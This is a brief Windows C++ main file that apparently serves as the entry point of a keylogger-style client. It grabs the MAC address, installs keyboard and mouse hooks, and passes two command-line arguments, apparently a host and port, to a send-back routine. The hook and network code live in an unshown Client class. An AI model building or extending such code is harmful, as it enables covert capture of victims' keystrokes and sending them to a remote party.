#include <windows.h>
#include <iostream>
#include "Client.h"

Client clt;

int main(int ac, char **av)
{
	if (ac != 3)
		return (1);
	clt.getMACAddress();

	clt.setKeyboardHook();
	clt.setMouseHook();
	clt.sendBackMessage(av[1], av[2]);
	return (0);
}